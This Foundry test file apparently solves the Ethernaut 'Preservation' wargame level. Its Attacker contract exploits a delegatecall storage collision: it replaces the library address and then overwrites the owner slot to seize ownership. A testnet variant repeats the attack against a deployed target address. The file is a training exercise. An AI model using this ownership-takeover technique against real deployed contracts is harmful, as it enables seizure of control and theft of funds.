// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../src/16_Preservation.sol";

contract ContractTest is Test {

    Preservation preservation;
    LibraryContract library1;
    LibraryContract library2;

    function setUp() public {

        library1 = new LibraryContract();
        library2 = new LibraryContract();

        address owner = vm.addr(1);
        vm.prank(owner);
        preservation = new Preservation(address(library1), address(library2));
    }

    function testAttack() public {
        _attack();
    }

    function _attack() internal {
        assert(preservation.owner() != address(this));

        Attacker attacker = new Attacker();
        // Set attacker instread of timeZone1Library address
        preservation.setFirstTime(uint256(uint160(address(attacker))));
        assert(preservation.timeZone1Library() == address(attacker));

        // Execute attacker
        preservation.setFirstTime(uint256(uint160(address(this))));
        assert(preservation.owner() == address(this));
    }
}

contract Attacker {
    uint slot0;
    uint slot1;
    address public owner; 

    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }
}

contract ContractTestnet is ContractTest {
    function attack(address target) external {
        preservation = Preservation(target);
        _attack();
    }
}